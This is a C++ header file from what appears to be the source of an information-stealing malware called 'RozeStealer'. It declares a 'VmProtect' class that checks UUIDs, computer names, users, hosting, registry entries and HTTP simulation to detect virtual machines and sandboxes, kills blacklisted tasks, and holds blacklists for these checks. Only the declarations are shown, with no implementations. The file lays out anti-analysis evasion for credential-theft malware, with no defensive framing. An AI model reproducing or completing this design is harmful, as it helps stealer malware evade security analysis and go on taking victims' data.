#ifndef ROZE_STEALER_VM_PROTECT_H
#define ROZE_STEALER_VM_PROTECT_H

#include <string>
#include <vector>
#include <map>

namespace RozeStealer {

class VmProtect {
public:
    static bool checkUUID();
    static bool checkComputerName();
    static bool checkUsers();
    static bool checkHosting();
    static bool checkHTTPSimulation();
    static bool checkRegistry();
    static void killTasks();
    static bool isVM();

private:
    static const std::vector<std::string> BLACKLISTED_UUIDS;
    static const std::vector<std::string> BLACKLISTED_COMPUTERNAMES;
    static const std::vector<std::string> BLACKLISTED_USERS;
    static const std::vector<std::string> BLACKLISTED_TASKS;
};

} // namespace RozeStealer

#endif // ROZE_STEALER_VM_PROTECT_H


